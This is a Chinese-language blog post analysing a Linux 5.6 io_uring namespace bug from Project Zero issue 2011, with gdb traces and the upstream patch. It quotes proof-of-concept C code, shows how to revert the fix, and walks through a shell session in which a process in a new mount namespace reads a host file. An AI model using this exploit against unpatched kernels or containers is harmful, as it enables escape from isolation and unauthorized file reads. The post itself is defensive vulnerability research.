# Linux "io_uring" namespace 的一个问题

阅读量 **496439**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-04-17 11:30:17

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01983dbaeef1086525.png)

看了jannh的[report](https://bugs.chromium.org/p/project-zero/issues/detail?id=2011), 有点迷迷糊糊的，于是跟着分析了一波。之前也分析过 io_uring
一个权限问题，io_uring代码还在频繁的更新，期间肯定会出现各种各样的安全问题，要找个时间研究一波hh.

## 环境配置

以下所有的分析都是在 ubuntu 18.04
虚拟机下，使用的是[linux-5.6](https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.6.tar.xz)
版本的内核，可以在[github](https://github.com/rtfingc/cve-repo/tree/master/0x02-p0-issue-2011-io_uring_namespace)上找到我的环境

## 漏洞分析

这个洞其实就是没有做好namespace的检查，最后导致可以读取其他namespace的文件，这放到容器里那就是逃逸了。这里从代码的层面看看究竟发生了什么。

###  poc

可以在[这里](https://bugs.chromium.org/p/project-zero/issues/detail?id=2011)
找到jannh 的poc,

    
    
    int main(void) {
      // initialize uring
      struct io_uring_params params = { };
      int uring_fd = SYSCHK(syscall(SYS_io_uring_setup, /*entries=*/10, &params));
      unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
      unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
      struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));
    
      // execute openat via uring
      sqes[0] = (struct io_uring_sqe) {
        .opcode = IORING_OP_OPENAT,
        .flags = IOSQE_ASYNC,
        .fd = open("/", O_RDONLY),
        .addr = (unsigned long)"/",
        .open_flags = O_PATH | O_DIRECTORY
      };
       ((int*)(sq_ring + params.sq_off.array))[0] = 0;
      (*(int*)(sq_ring + params.sq_off.tail))++;
      int submitted = SYSCHK(syscall(SYS_io_uring_enter, uring_fd, /*to_submit=*/1, /*min_complete=*/1, /*flags=*/IORING_ENTER_GETEVENTS, /*sig=*/NULL, /*sigsz=*/0));
    

主要看传入的 `sqes` 部分， 传入的opcode是`IORING_OP_OPENAT`, `IOSQE_ASYNC`
表示用异步的方式，打开的是`"/"` 目录

因为这里使用的内核是已经打上了补丁了，为了测试漏洞，我们需要手动patch一下，找到`fs/io_uring.c` 文件, 按照下面把对 fs的检查注释掉。

    
    
    static inline void io_req_work_grab_env(struct io_kiocb *req,    
                        const struct io_op_def *def)                 
    {                                                                
        if (!req->work.mm && def->needs_mm) {                        
            mmgrab(current->mm);                                     
            req->work.mm = current->mm;                              
        }                                                            
        if (!req->work.creds)                                        
            req->work.creds = get_current_cred();                    
        /*if (!req->work.fs && def->needs_fs) {*/                    
            /*spin_lock(&current->fs->lock);*/                       
            /*if (!current->fs->in_exec) {*/                         
                /*req->work.fs = current->fs;*/                      
                /*req->work.fs->users++;*/                           
            /*} else {*/                                             
                /*req->work.flags |= IO_WQ_WORK_CANCEL;*/            
            /*}*/                                                    
            /*spin_unlock(&current->fs->lock);*/                     
        /*}*/                                                        
        if (!req->work.task_pid)                                     
            req->work.task_pid = task_pid_vnr(current);              
    }                                                                
    static inline void io_req_work_drop_env(struct io_kiocb *req)     
    {                                                                 
        if (req->work.mm) {                                           
            mmdrop(req->work.mm);                                     
            req->work.mm = NULL;                                      
        }                                                             
        if (req->work.creds) {                                        
            put_cred(req->work.creds);                                
            req->work.creds = NULL;                                   
        }                                                             
        /*if (req->work.fs) {*/                                       
            /*struct fs_struct *fs = req->work.fs;*/                  
    
            /*spin_lock(&req->work.fs->lock);*/                       
            /*if (--fs->users)*/                                      
                /*fs = NULL;*/                                        
            /*spin_unlock(&req->work.fs->lock);*/                     
            /*if (fs)*/                                               
                /*free_fs_struct(fs);*/                               
        /*}*/                                                         
    }
    

###  代码分析

`SYS_io_uring_enter` 之后的调用链如下

    
    
    __do_sys_io_uring_enter
        - io_submit_sqes
            - io_submit_sqe
                - io_queue_sqe
                    - io_req_defer_prep //<--                        - io_req_work_grab_env
    

`io_req_defer_prep` 函对传入的各种opcode做switch， 我们传入的是`IORING_OP_OPENAT`,
对应调用`io_openat_prep`

    
    
          break;                                       
      case IORING_OP_LINK_TIMEOUT:                     
          ret = io_timeout_prep(req, sqe, true);       
          break;                                       
      case IORING_OP_ACCEPT:                           
          ret = io_accept_prep(req, sqe);              
          break;                                       
      case IORING_OP_FALLOCATE:                        
          ret = io_fallocate_prep(req, sqe);           
          break;                                       
      case IORING_OP_OPENAT:    // <-------------------------------                       
          ret = io_openat_prep(req, sqe);              
          break;                                       
      case IORING_OP_CLOSE:                            
          ret = io_close_prep(req, sqe);               
          break;                                       
      case IORING_OP_FILES_UPDATE:                     
          ret = io_files_update_prep(req, sqe);
    

`io_openat_prep` 主要是把sqes 的东西拿出来保存好, `io_req_defer_prep`
执行完之后会调用`io_queue_async_work(req)`

    
    
    static int io_openat_prep(struct io_kiocb *req, const struct io_uring_sqe *sqe)     
    {                                                                                   
        const char __user *fname;                                                       
        int ret;                                                                        
    
        if (sqe->ioprio || sqe->buf_index)                                              
            return -EINVAL;                                                             
        if (sqe->flags & IOSQE_FIXED_FILE)                                              
            return -EBADF;                                                              
        if (req->flags & REQ_F_NEED_CLEANUP)                                            
            return 0;                                                                   
    
        req->open.dfd = READ_ONCE(sqe->fd);                                             
        req->open.how.mode = READ_ONCE(sqe->len);                                       
        fname = u64_to_user_ptr(READ_ONCE(sqe->addr));                                  
        req->open.how.flags = READ_ONCE(sqe->open_flags);                               
    
        req->open.filename = getname(fname);                                            
        if (IS_ERR(req->open.filename)) {                                               
            ret = PTR_ERR(req->open.filename);                                          
            req->open.filename = NULL;                                                  
            return ret;                                                                 
        }                                                                               
    
        req->open.nofile = rlimit(RLIMIT_NOFILE);                                       
        req->flags |= REQ_F_NEED_CLEANUP;                                               
        return 0;                                                                       
    }
    

`io_queue_async_work` 把`req->work` 加入到 work queue, 之后会启动一个内核线程来执行这个work

    
    
    static inline void io_queue_async_work(struct io_kiocb *req)          
    {                                                                     
        struct io_ring_ctx *ctx = req->ctx;                               
        struct io_kiocb *link;                                            
        bool do_hashed;                                                   
    
        do_hashed = io_prep_async_work(req, &link);                       
    
        trace_io_uring_queue_async_work(ctx, do_hashed, req, &req->work,  
                        req->flags);                                      
        if (!do_hashed) {                                                 
            io_wq_enqueue(ctx->io_wq, &req->work);                        
        } else {                                                          
            io_wq_enqueue_hashed(ctx->io_wq, &req->work,                  
                        file_inode(req->file));                           
        }                                                                 
    
        if (link)                                                         
            io_queue_linked_timeout(link);                                
    }
    

实际调试看看，在[`fs/io_uring.c:912`](https://elixir.bootlin.com/linux/v5.6/source/fs/io_uring.c#L912)
处下个断点

    
    
    gef➤  info args
    req = 0xffff88800d042c00
    sqe = 0xffff88800d0c8000
    gef➤  p *req
    $1 = {
      {
        file = 0xffff88800eec4800,
    //....
    open = {
      file = 0xffff88800eec4800,
      dfd = 0x0,
      {
        mask = 0x0
      },
      filename = 0x0 <fixed_percpu_data>,
      buffer = 0x0 <fixed_percpu_data>,
      how = {
        flags = 0x0,
        mode = 0x0,
        resolve = 0x0
      },
      nofile = 0x0
    },
    //..
      work = {
        {
          list = {
            next = 0x0 <fixed_percpu_data>
          },
          data = 0x0 <fixed_percpu_data>
        },
        func = 0xffffffff81354760 <io_wq_submit_work>,// <===
        files = 0xffff88800ed90580,
        mm = 0x0 <fixed_percpu_data>,
        creds = 0x0 <fixed_percpu_data>,
        fs = 0x0 <fixed_percpu_data>,
        flags = 0x0,
        task_pid = 0x0
      }
    }
    

在work字段里对应的是`io_wq_submit_work` 函数，进入到这个函数，已经是内核线程了，我们可以下个断点看看

    
    
    gef➤  bt
    #0  io_wq_submit_work (workptr=0xffffc90000277e88) at fs/io_uring.c:4522
    #1  0xffffffff81356bba in io_worker_handle_work (worker=0xffff88800e08df00) at fs/io-wq.c:511
    #2  0xffffffff81357679 in io_wqe_worker (data=0xffff88800e08df00) at fs/io-wq.c:552
    #3  0xffffffff810c0fe1 in kthread (_create=0xffff88800d066b00) at kernel/kthread.c:255
    #4  0xffffffff81c00215 in ret_from_fork () at arch/x86/entry/entry_64.S:352
    #5  0x0000000000000000 in ?? ()
    gef➤  kcurrent
    smp system (__per_cpu_offset) 0xffffffff8245c920
    cpu_num 0x1
    swapper_pgd 0x0
    cpu #0 : 0xffff88800f200000
        current_task: 0xffff88800eee1600  :io_wqe_worker-0
            uid: 0x0   gid: 0x0  :cred 0xffff88800eec2540
            mm: 0x0
            pgd: 0x0
    

最后会进入`io_issue_sqe`函数，然后根据传进来的opcode做switch, 在内核线程里调用`io_openat`。

    
    
        case IORING_OP_OPENAT:                           
            if (sqe) {                                   
                ret = io_openat_prep(req, sqe);          
                if (ret)                                 
                    break;                               
            }                                            
            ret = io_openat(req, nxt, force_nonblock);
    

接着调用`do_filp_open` 来打开文件返回文件描述符。貌似没有什么问题呀，正常的调用openat， 正常的打开文件或文件夹。

这是应用场景的不同，这里出现漏洞的原因是它没有对不同的namespace做区分，namespace是linux对系统资源的一种隔离机制，我们熟悉的docker就有用到namespace的东西，namespace相关的东西可以参考[这篇文章](https://segmentfault.com/a/1190000009732550),写的真棒，这里不做过多的描述。

###  利用测试

完整的利用流程如下

    
    
    /home/pwn # echo aaaa > /tmp/real
    /home/pwn # echo $$
    206
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:55 mnt -> mnt:[4026531840]
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)-+-grep(212)
    /home/pwn # unshare -m --uts /bin/sh
    /bin/sh: can't access tty; job control turned off
    /home/pwn # echo $$
    213
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)---sh(213)-+-grep(215)
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:56 mnt -> mnt:[4026532131]
    /home/pwn # mount -t tmpfs none /tmp
    /home/pwn # ls /tmp
    /home/pwn # /exp
    submitted 1, getevents done
    cq_tail = 1
    result: 5
    launching shell
    sh: can't access tty; job control turned off
    /home/pwn # echo $$
    223
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)---sh(213)---exp(220)---sh(223)-+-grep(225)
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:57 mnt -> mnt:[4026532131]
    /home/pwn # ls -al /proc/$$/fd/
    total 0
    dr-x------    2 root     0                0 Apr 15 02:58 .
    dr-xr-xr-x    9 root     0                0 Apr 15 02:57 ..
    lrwx------    1 root     0               64 Apr 15 02:58 0 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 1 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 2 -> /dev/console
    lr-x------    1 root     0               64 Apr 15 02:58 4 -> /
    l---------    1 root     0               64 Apr 15 02:58 5 -> /
    /home/pwn # cat /proc/$$/fd/5/tmp/real
    aaaa
    /home/pwn # C#
    

首先创建一个 `/tmp/real` 文件，写入`aaaa`, 看一下当前shell的 mount namespace，
记住他的id为`4026531840`,

    
    
    /home/pwn # echo aaaa > /tmp/real
    /home/pwn # echo $$
    206
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:55 mnt -> mnt:[4026531840]
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)-+-grep(212)
    

接着用 `unshare` 创建一个新的 mount namespace, 然后mount 上 tmpfs, 可以看到namespace的
id是`4026532131`，和原来的不同， 这个时候就看不到原来namespace的目录下的东西了(想一下docker的隔离),

    
    
    /home/pwn # unshare -m --uts /bin/sh
    /bin/sh: can't access tty; job control turned off
    /home/pwn # echo $$
    213
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)---sh(213)-+-grep(215)
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:56 mnt -> mnt:[4026532131]
    /home/pwn # mount -t tmpfs none /tmp
    /home/pwn # ls /tmp
    

接着运行 exp， 它会打开`/` 目录，返回的`fd`是 5

    
    
    /home/pwn # /exp
    submitted 1, getevents done
    cq_tail = 1
    result: 5
    launching shell
    sh: can't access tty; job control turned off
    /home/pwn # echo $$
    223
    /home/pwn # ls -al /proc/$$/fd/
    total 0
    dr-x------    2 root     0                0 Apr 15 02:58 .
    dr-xr-xr-x    9 root     0                0 Apr 15 02:57 ..
    lrwx------    1 root     0               64 Apr 15 02:58 0 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 1 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 2 -> /dev/console
    lr-x------    1 root     0               64 Apr 15 02:58 4 -> /
    l---------    1 root     0               64 Apr 15 02:58 5 -> /
    /home/pwn # cat /proc/$$/fd/5/tmp/real
    aaaa
    

进去看一下可以发现这里打开的是原来namespace的`"/"` 目录。

linux 默认情况下所有的进程都会有一个系统默认的namespace,
也就是说本身linux就是一个最初的容器，我们新的namespace只是在最初的容器下创建一个新容器罢了。

从前面的分析我们知道，最后由于是异步的调用，会在内核线程`io_wqe_worker-0` 里调用 `do_filp_open` `来打开目录，
所有的内核线程都继承自`kthreadd` 线程，使用的是默认的mount namespace

    
    
    gef➤  kcurrent                                           
    smp system (__per_cpu_offset) 0xffffffff8245c920         
    cpu_num 0x1                                              
    swapper_pgd 0x0                                          
    cpu #0 : 0xffff88800f200000                              
        current_task: 0xffff88800d080000  :io_wqe_worker-0   
            uid: 0x0   gid: 0x0  :cred 0xffff88800eec2840    
            mm: 0x0                                          
            pgd: 0x0                                         
    gef➤  kproc                                                     
    0x1  :init            :  uid: 0  task: 0xffff88800ed88000
    0x2  :kthreadd        :  uid: 0  task: 0xffff88800ed89600
    0x3  :rcu_gp          :  uid: 0  task: 0xffff88800ed8ac00
    //...
    0xcf :sh              :  uid: 0  task: 0xffff88800d085800
    0xd2 :exp             :  uid: 0  task: 0xffff88800d084200//
    0xd3 :io_wq_manager   :  uid: 0  task: 0xffff88800d081600
    0xd4 :io_wqe_worker-0 :  uid: 0  task: 0xffff88800d080000//
    

我们看一下他们的namespace

    
    
    gef➤  p *((struct task_struct *)0xffff88800d084200)->nsproxy // exp  进程
    $1 = {
      count = {
        counter = 0x2
      },
      uts_ns = 0xffffffff82613620 <init_uts_ns>,
      ipc_ns = 0xffffffff8273c7c0 <init_ipc_ns>,
      mnt_ns = 0xffff88800d6ece80,
      pid_ns_for_children = 0xffffffff8265f7e0 <init_pid_ns>,
      net_ns = 0xffffffff827f5ec0 <init_net>,
      time_ns = 0xffffffff826bc940 <init_time_ns>,
      time_ns_for_children = 0xffffffff826bc940 <init_time_ns>,
      cgroup_ns = 0xffffffff826c1780 <init_cgroup_ns>
    }
    gef➤  p *((struct task_struct *)0xffff88800ed89600)->nsproxy//kthreadd
    $3 = {
      count = {
        counter = 0x35
      },
      uts_ns = 0xffffffff82613620 <init_uts_ns>,
      ipc_ns = 0xffffffff8273c7c0 <init_ipc_ns>,
      mnt_ns = 0xffff88800ec65680,
      pid_ns_for_children = 0xffffffff8265f7e0 <init_pid_ns>,
      net_ns = 0xffffffff827f5ec0 <init_net>,
      time_ns = 0xffffffff826bc940 <init_time_ns>,
      time_ns_for_children = 0xffffffff826bc940 <init_time_ns>,
      cgroup_ns = 0xffffffff826c1780 <init_cgroup_ns>
    }
    
    gef➤  p *((struct task_struct *)0xffff88800d080000)->nsproxy//io_wqe_worker-0
    $2 = {
      count = {
        counter = 0x35
      },
      uts_ns = 0xffffffff82613620 <init_uts_ns>,
      ipc_ns = 0xffffffff8273c7c0 <init_ipc_ns>,
      mnt_ns = 0xffff88800ec65680,
      pid_ns_for_children = 0xffffffff8265f7e0 <init_pid_ns>,
      net_ns = 0xffffffff827f5ec0 <init_net>,
      time_ns = 0xffffffff826bc940 <init_time_ns>,
      time_ns_for_children = 0xffffffff826bc940 <init_time_ns>,
      cgroup_ns = 0xffffffff826c1780 <init_cgroup_ns>
    }
    gef➤
    

可以看到，`io_wqe_worker-0` 的`mnt_ns` 地址是`0xffff88800ec65680`
，和默认值一样，因为exp是运行在新的namespace下，它的`mnt_ns=0xffff88800d6ece80`，整理一下

  * 1 exp 运行（`mnt_ns=0xffff88800d6ece80`)
  * 2 io_uring 启动内核线程 openat, 内核线程`io_wqe_worker-0` 使用默认的`mnt_ns`

于是`io_wqe_worker-0` 看到的是一开始的mount namespace, 打开的也是原来namespace的`"/"`
目录，于是我们就可以通过这个fd来任意读里面的内容啦。

###  补丁

给出的[补丁](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff002b30181d30cdfbca316dadd099c3ca0d739c)
如下, 添加了`fs` 字段，然后 启动内核线程前把 exp 的 fs 保存到 `req->work.fs` 里面

    
    
    @@ -907,6 +915,16 @@ static inline void io_req_work_grab_env(struct io_kiocb *req,
         }
         if (!req->work.creds)
             req->work.creds = get_current_cred();
    +    if (!req->work.fs && def->needs_fs) {
    +        spin_lock(&current->fs->lock);
    +        if (!current->fs->in_exec) {
    +            req->work.fs = current->fs;
    +            req->work.fs->users++;
    +        } else {
    +            req->work.flags |= IO_WQ_WORK_CANCEL;
    +        }
    +        spin_unlock(&current->fs->lock);
    +    }
     }
    
     static inline void io_req_work_drop_env(struct io_kiocb *req)
    @@ -919,6 +937,16 @@ static inline void io_req_work_drop_env(struct io_kiocb *req)
             put_cred(req->work.creds);
             req->work.creds = NULL;
         }
    +    if (req->work.fs) {
    +        struct fs_struct *fs = req->work.fs;
    +
    +        spin_lock(&req->work.fs->lock);
    +        if (--fs->users)
    +            fs = NULL;
    +        spin_unlock(&req->work.fs->lock);
    +        if (fs)
    +            free_fs_struct(fs);
    +    }
     }
    

然后再在内核线程里面检查一致性。

    
    
    if (work->fs && current->fs != work->fs)     
        current->fs = work->fs;
    

## 小结

总的来说这里和之前[cve-2019-19241](https://www.anquanke.com/post/id/200486),差不多，都是因为在内核线程里面没有做好检查，然后可以做一些不可描述的事情，漏洞本身其实也不能说是漏洞，就是忘了检查…通过这个issue学习了一波namespace和cgroup的东西，满足:P.

## reference

<https://bugs.chromium.org/p/project-zero/issues/detail?id=2011>

https://lore.kernel.org/io-uring/20200207155039.12819-1-axboe@kernel.dk/T/

https://lore.kernel.org/io-uring/20200207155039.12819-1-axboe@kernel.dk/T/

<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff002b30181d30cdfbca316dadd099c3ca0d739c>

<https://segmentfault.com/a/1190000009732550>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **rtfingc** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/203112](/post/id/203112)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [linux](/tag/linux)
  * [io_uring](/tag/io_uring)

 **+1** __2赞

 __收藏

![](https://p1.ssl.qhimg.com/t0194acf280719427c3.png) rtfingc

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

